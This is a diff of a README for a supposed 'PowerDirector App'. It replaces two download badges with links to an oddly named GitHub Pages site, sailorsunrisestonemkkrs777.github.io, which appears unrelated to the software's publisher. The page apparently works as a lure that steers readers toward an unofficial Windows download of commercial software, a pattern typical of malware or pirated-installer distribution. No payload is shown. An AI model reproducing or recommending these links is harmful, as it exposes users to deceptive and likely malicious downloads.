@@ -5,11 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
-  
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://powerdirector-app.github.io/.github/)
+[![GET Powerdirector App](https://img.shields.io/badge/GET%20%E2%80%94%20Powerdirector-App-0078D6?style=for-the-badge&logoColor=white)](https://sailorsunrisestonemkkrs777.github.io/.github/Powerdirector-App)
 
-</div>
 
 ---
 
@@ -27,11 +24,7 @@ PowerDirector tools ensure that complex video projects remain organized, while P
 <img src="https://i.ytimg.com/vi/2oyasE8j0iE/maxresdefault.jpg" alt="PowerDirector Interface" width="auto">
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://powerdirector-app.github.io/.github/)
-
-</div>
+[![GET Powerdirector App](https://img.shields.io/badge/GET%20%E2%80%94%20Powerdirector-App-0078D6?style=for-the-badge&logoColor=white)](https://sailorsunrisestonemkkrs777.github.io/.github/Powerdirector-App)
 
 ---
 
